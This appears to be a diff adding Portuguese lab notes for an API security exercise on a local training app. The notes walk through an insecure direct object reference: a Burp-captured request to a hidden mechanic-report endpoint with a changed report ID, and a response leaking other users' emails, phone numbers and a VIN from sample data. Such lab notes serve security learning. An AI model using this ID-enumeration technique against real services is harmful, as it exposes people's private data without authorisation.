@@ -7,3 +7,30 @@ Analisar o processo de envio de relatórios
 Encontrar um endpoint oculto da API que exponha detalhes de um relatório de mecânico
 
 Alterar o ID do relatório para acessar outros relatórios
+
+
+
+Burp na página de contactar mecanico
+
+GET http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=10
+
+"id": 5,
+    "mechanic": {
+        "id": 1,
+        "mechanic_code": "TRAC_JHN",
+        "user": {
+            "email": "jhon@example.com",
+            "number": ""
+        }
+    },
+    "vehicle": {
+        "id": 3,
+        "vin": "0NKPZ09IHOP508673",
+        "owner": {
+            "email": "robot001@example.com",
+            "number": "9876570001"
+        }
+    },
+    "problem_details": "My car BMW - 5 Series is having issues.\nCan you give me a call on my mobile 9876570001,\nOr send me an email at robot001@example.com\nThanks,\nRobot.\n",
+    "status": "pending",
+    "created_on": "01 September, 2025, 20:30:29"
